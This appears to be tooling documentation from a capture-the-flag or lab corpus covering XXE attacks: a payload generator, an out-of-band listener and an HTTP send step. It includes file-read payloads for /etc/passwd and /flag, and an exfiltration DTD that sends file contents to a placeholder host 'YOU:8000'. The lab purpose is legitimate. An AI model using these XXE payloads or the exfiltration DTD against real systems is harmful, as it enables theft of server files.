# Tooling — `tools/web/xxe_gen.py` + `tools/web/oob_listener.py`

## `xxe_gen.py` — the payload generator

```bash
python3 tools/web/xxe_gen.py --help
python3 tools/web/xxe_gen.py --selftest
python3 tools/web/xxe_gen.py --probe                    # the harmless internal-entity probe
python3 tools/web/xxe_gen.py --file /etc/passwd         # file-read entity payload
python3 tools/web/xxe_gen.py --oob http://YOU:8080/     # blind-OOB param-entity payload
python3 tools/web/xxe_gen.py --oob http://YOU:8080/ --file /flag   # OOB carrying file
python3 tools/web/xxe_gen.py --file /flag --json        # JSON output for scripting
python3 tools/web/xxe_gen.py --file /flag --root data   # custom root element name
```

Output is the full XML document ready to send — `http_probe` carries it
as `--body` with `Content-Type: application/xml`.

## `oob_listener.py` — the catch side

```bash
python3 tools/web/oob_listener.py --help
python3 tools/web/oob_listener.py serve --port 8000 --seconds 120 --log /tmp/oob.log
python3 tools/web/oob_listener.py hits --log /tmp/oob.log
python3 tools/web/oob_listener.py canary --base http://YOUR-HOST:8000/
```

- `serve` — runs the listener, logs every hit to `--log`
- `hits` — parses the log, prints each callback with its query/path —
  this is your exfil channel's readout
- `canary` — emits a unique token URL you embed in the payload so the
  hit proves YOUR probe fired, not someone else's

## The send side — `http_probe.py`

```bash
python3 tools/web/xxe_gen.py --file /etc/passwd > /tmp/xxe.xml
python3 tools/web/http_probe.py --challenge <name> \
  --url http://target/endpoint \
  --method POST \
  --header "Content-Type: application/xml" \
  --body "$(cat /tmp/xxe.xml)"
```

`http_probe` emits the whole `post-probe` command with `--response`
filled — the evidence gate needs the verbatim response.

## The content-type variants the corpus needs

- `application/xml`, `text/xml` — XML surface
- `application/soap+xml`, `text/xml` + `SOAPAction` — SOAP
- `application/x-www-form-urlencoded` with an `xml=` field — the
  parameter-is-XML shape
- `application/json` with an XML string field — nested
- `multipart/form-data` with an `.svg`/`.docx` — upload surface

## Generating the OOB DTD — host it yourself

`xxe_gen.py --oob` emits the caller-side payload; the DTD it references
must be served. Minimal:

```bash
cat > /tmp/e.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU:8000/?d=%file;'>">
%wrap;
EOF
python3 -m http.server 8000 --directory /tmp &
# or use oob_listener serve for hit-logging AND file-serving in one
```

The exfil-DTD pattern — `%file;` reads, `%wrap;` builds the entity that
sends it back — `blind-xxe.md`.

## The measured-absent caveat

No dedicated XXE tool beyond `xxe_gen`/`oob_listener` — the corpus is
built on those two + `http_probe`. `curl`/`httpie`/`Burp` exist for
the raw-send side.

## Self-test first — always

```bash
python3 tools/web/xxe_gen.py --selftest
python3 tools/web/selftest.py
```
